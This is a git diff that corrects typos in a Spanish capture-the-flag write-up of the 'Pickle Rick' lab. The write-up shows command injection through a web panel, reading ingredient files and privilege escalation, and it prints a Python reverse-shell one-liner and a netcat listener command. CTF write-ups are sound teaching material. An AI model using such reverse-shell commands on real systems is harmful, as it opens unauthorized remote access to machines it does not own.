@@ -22,7 +22,7 @@ Lo primero que haremos es un escaneo de los puertos, donde nos encontramos 2 ser
 
 ### Incursionando en el puerto 80
 
-Veremosque nos entrega el puerto 80 para ver si nos entrega mas información, ya que, al no tener credenciales no podremos acceder al servicio SSH.
+Veremos que nos entrega el puerto 80 para ver si nos entrega mas información, ya que, al no tener credenciales no podremos acceder al servicio SSH.
 Vemos que hay una página que a simple vista no nos entrega mucha información
 
 ![img-description](/assets/img/pickle_rick/http.png)
@@ -68,7 +68,7 @@ Veamos, si podemos ingresar comandos como "whoami". Interesante, nos dice que so
 
 ![img-description](/assets/img/pickle_rick/whoami.png)
 
-Probemos con "ls" para listar el directorio donde nos encontramos. Vaya! acá nos enctronamos con varios archivos, ente ellos "Sup3rS3cretPickl3Ingred.txt" y "clue.txt"
+Probemos con "ls" para listar el directorio donde nos encontramos. Vaya! acá nos encontramos con varios archivos, ente ellos "Sup3rS3cretPickl3Ingred.txt" y "clue.txt"
 
 ![img-description](/assets/img/pickle_rick/ls.png)
 
@@ -78,7 +78,7 @@ Probaremos "cat" para que nos imprima el contenido de "Sup3rS3cretPickl3Ingred.t
 
 ![img-description](/assets/img/pickle_rick/cat_error.png)
 
-Veremos si con "less" podemos acceder al contenido de "Sup3rS3cretPickl3Ingred.txt". Si funciona y ya tenemos primer ingrediente que necesita Rick para su poción: "mr. meeseek hair"
+Veremos si con "less" podemos acceder al contenido de "Sup3rS3cretPickl3Ingred.txt". Si funciona y ya tenemos el primer ingrediente que necesita Rick para su poción: "mr. meeseek hair"
 
 ![img-description](/assets/img/pickle_rick/less.png)
 
@@ -90,7 +90,7 @@ Veamos ahora el contenido de "clue.txt". Es una pista! y dice: "Look around the 
 
 ![img-description](/assets/img/pickle_rick/clue_pista.png)
 
-Para poder movernos entre directorios de forma comoda dentro del sistema se me ocurre ver si me puedo conectar a través de netcat ocupando una revshell. LO primero que quiero ver es si tiene instalado python3.
+Para poder movernos entre directorios de forma comoda dentro del sistema se me ocurre ver si me puedo conectar a través de netcat ocupando una revshell. Lo primero que quiero ver es si tiene instalado python3.
 
 ![img-description](/assets/img/pickle_rick/which.png)
 
@@ -100,7 +100,11 @@ Y como se puede apreciar si lo tiene instalado
 
 Ocuparé la siguiente revshell
 
-python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("Tú IP",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")' (*no te olvides de colocar tú IP donde dice "Tú IP")
+```terminal
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("Tú IP",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
+```
+
+ (*no te olvides de colocar tú IP donde dice "Tú IP")
 
 Y estaremos a la escucha con  nc -lvnp 9001
 
@@ -122,7 +126,7 @@ Tendremos que escalar privilegios para poder acceder a ese directorio. Primero v
 
 ![img-description](/assets/img/pickle_rick/root.png)
 
-Ahora veremos el contenido del directorio "rick". Y ahí está el seguindo ingrediente que necesita Rick: "1 jerry tear". Solo nos falta uno que lo mas probable esté en eñ directorio root
+Ahora veremos el contenido del directorio "rick". Y ahí está el segundo ingrediente que necesita Rick: "1 jerry tear". Solo nos falta uno que lo mas probable esté en el directorio root
 
 ![img-description](/assets/img/pickle_rick/2ingr.png)
 
